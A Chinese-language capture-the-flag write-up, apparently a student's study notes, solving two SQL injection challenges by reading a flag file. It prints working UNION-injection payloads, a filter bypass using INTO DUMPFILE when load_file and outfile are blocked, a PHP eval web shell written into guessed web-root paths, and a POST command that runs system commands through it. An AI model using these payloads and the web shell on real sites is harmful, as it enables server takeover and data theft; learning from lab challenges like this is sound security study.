打开容器，怀疑和上一题一样，f12发现了

```
 flag in /conquer_secret.txt 
```

和上一题一样，输入

```
-1' union select 1,load_file('/conquer_secret.txt'),3 -- 
```

这里显示非法函数注入，经过尝试发现load_file进入黑名单，已知在mysql里读取文件的函数只有load_file所以我们换一下方向，尝试into outfile写入文件，在写入文件之前，确定文件路径，输入

```
-1' union select 1,'test',3 into outfile '/var/www/html/test.txt' -- 
```

访问/test.txt，发现文件写入成功

![image-20261023194609695](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261023194609695.png)

获得路径/var/www/html/接着写入木马文件，输入

```
-1' union select 1,'<?php @eval($_POST[1]);?>',3 into outfile '/var/www/html/shell.php' -- 
```

访问/shell.php在hackbar里post请求输入

```
1=system('cat%20/conquer_secret.txt');
```

获得flag。

如果在寻找文件路径行不同时，可以依次尝试

```
/var/www/html/
/var/www/
/usr/share/nginx/html/
/app/
C:/phpstudy_pro/WWW/
```

并访问来确定文件路径

## ezsql_23(文件读写过滤load_file和outfile的写入木马类)

依据前两题，仍然存在f12里的flag提示

```
 flag in /conquer_secret.txt 
```

依据上次的经验先尝试load_file发现被ban，在尝试into outfile写木马，又被ban，逐个排查发现是outfile被ban了，但是into没有ban，这个给了我们一个提示，因为写入木马文件除了into oufile外还有into dumpfile，尝试这个函数发现没有被ban确定了我们要用的函数是into dumpfile。继续上一题的习惯，找文件路径，一次尝试下面的路径

```
/var/www/html/
/var/www/
/usr/share/nginx/html/
/app/
C:/phpstudy_pro/WWW/
```

带入语句

```
-1' union select 1,'test',3 into dumpfile '/var/www/html/test.txt' -- 
```

在/var/www/html/这个路径获得回显

```
1test3
```

植入木马，输入

```
-1' union select 1,'<?php @eval($_POST[1]);?>',3 into dumpfile '/var/www/html/shell.php' -- 
```

访问/shell.php接着hackbar里post请求

```
1=system('cat%20/conquer_secret.txt');
```

获得flag，到这里目前青岑的ezsql系列就全部完成了喵，嘻嘻.....awa

------

# *总结*

本周主要是进行了基础性的学习，后续还有很多的东西需要去学习，目前掌握的知识甚至达不到冰山一角，网安的路还很长，需要脚踏实地的走下去